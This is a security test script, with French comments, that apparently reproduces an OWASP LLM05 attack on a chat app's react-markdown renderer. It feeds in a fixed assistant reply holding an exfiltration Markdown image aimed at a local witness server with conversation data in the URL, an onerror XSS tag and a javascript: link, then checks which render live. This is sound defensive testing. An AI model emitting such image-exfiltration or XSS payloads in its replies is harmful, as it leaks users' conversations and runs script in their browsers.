// Attaque 2 - Sortie non maitrisee via Markdown (OWASP LLM05), volet DETERMINISTE.
//
// On rejoue EXACTEMENT ce que fait le composant d'affichage de l'app
// (apps/web/src/chat/MessageBubble.tsx) : react-markdown + remark-gfm, SANS
// rehype-raw. On lui donne une reponse d'assistant contenant deux charges
// utiles et on regarde le HTML produit.
//
// But : separer ce qui depend du RENDU (le vrai sujet LLM05) de ce qui depend
// du modele. Ici, aucune variance : on fixe la sortie du modele et on observe
// le rendu. Les memes versions que l'app sont utilisees (node_modules de la
// racine du monorepo).
//
// Usage : node security/attacks/02-sortie-markdown/render-repro.mjs
import { writeFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import Markdown from "react-markdown";
import remarkGfm from "remark-gfm";

// Charge utile 1 : image Markdown native. Son URL pointe vers le serveur temoin.
// Charge utile 2 : HTML brut avec un gestionnaire onerror qui ferait un
// console.log("XSS-OK") s'il etait execute.
const MODEL_OUTPUT = [
  "Bien sur, voici une petite demonstration.",
  "",
  "Image distante : ![pixel](http://127.0.0.1:9999/exfil?d=conversation-de-bruno)",
  "",
  'Exemple de balise HTML : <img src=x onerror="console.log(\'XSS-OK\')">',
  "",
  'Autre forme : <a href="javascript:console.log(\'XSS-OK\')">clique ici</a>',
].join("\n");

// Config IDENTIQUE a l'app : remark-gfm, pas de rehype-raw. (Le composant <a>
// personnalise de l'app ne touche ni aux images ni au HTML brut : on garde le
// rendu par defaut pour ces elements.)
const element = React.createElement(Markdown, { remarkPlugins: [remarkGfm] }, MODEL_OUTPUT);
const html = renderToStaticMarkup(element);

console.log("=== Sortie du modele (entree du composant) ===");
console.log(MODEL_OUTPUT);
console.log("\n=== HTML reellement produit par react-markdown ===");
console.log(html);

console.log("\n=== Analyse ===");
// Image Markdown -> vraie balise <img> (et un <link rel=preload as=image>).
const hasImg = /<img\s[^>]*src="http:\/\/127\.0\.0\.1:9999\/exfil/i.test(html);
const hasPreload = /<link[^>]*rel="preload"[^>]*127\.0\.0\.1:9999/i.test(html);
// Attribut dangereux VIVANT = present dans une vraie balise "<..." (pas dans
// du texte echappe, qui commence par "&lt;").
const liveOnerror = /<[a-z][^>]*\sonerror=/i.test(html);
const liveJsHref = /<a[^>]*href="javascript:/i.test(html);
// Le HTML brut injecte se retrouve en texte echappe : preuve qu'il est inerte.
const rawEscaped = html.includes("&lt;img") && html.includes("onerror=&quot;");
console.log(`Image <img> vers le serveur temoin dans le DOM : ${hasImg ? "OUI" : "non"}`);
console.log(`  (+ <link rel=preload as=image> vers la meme URL : ${hasPreload ? "OUI" : "non"})`);
console.log(`  -> un navigateur chargerait cette image AUTOMATIQUEMENT (requete sortante, sans clic).`);
console.log(`Attribut onerror VIVANT (vraie balise) dans le DOM : ${liveOnerror ? "OUI (danger)" : "non"}`);
console.log(`Lien href="javascript:" VIVANT dans le DOM         : ${liveJsHref ? "OUI (danger)" : "non"}`);
console.log(`HTML brut injecte neutralise (texte echappe)       : ${rawEscaped ? "OUI" : "non"}`);
console.log("\n=== Verdicts ===");
console.log(`XSS par HTML brut (onerror / javascript:) : ${liveOnerror || liveJsHref ? "VULNERABLE" : "RESISTANT (HTML echappe, pas de rehype-raw)"}`);
console.log(`Exfiltration par image Markdown           : ${hasImg ? "VULNERABLE (fuite silencieuse au rendu)" : "resistant"}`);

// Ecrit le DOM produit dans une page autonome. L'ouvrir dans un navigateur
// (ex: `open security/attacks/02-sortie-markdown/repro.html`) fait charger
// l'image par le navigateur => une entree apparait dans hits.log du serveur
// temoin, SANS aucun clic. C'est la preuve "live" de l'exfiltration.
const page = `<!doctype html>
<html lang="fr"><head><meta charset="utf-8"><title>Repro LLM05</title></head>
<body>
<p>Page de reproduction. Si le serveur temoin tourne (port 9999), son hits.log
doit recevoir une requete des l'ouverture de cette page.</p>
<hr>
<!-- DOM produit par react-markdown avec la config de l'app (sans rehype-raw) : -->
${html}
</body></html>
`;
const out = fileURLToPath(new URL("./repro.html", import.meta.url));
writeFileSync(out, page);
console.log(`\nPage de preuve "live" ecrite : ${out}`);
console.log(`Ouvre-la dans un navigateur puis regarde hits.log (aucun clic requis).`);
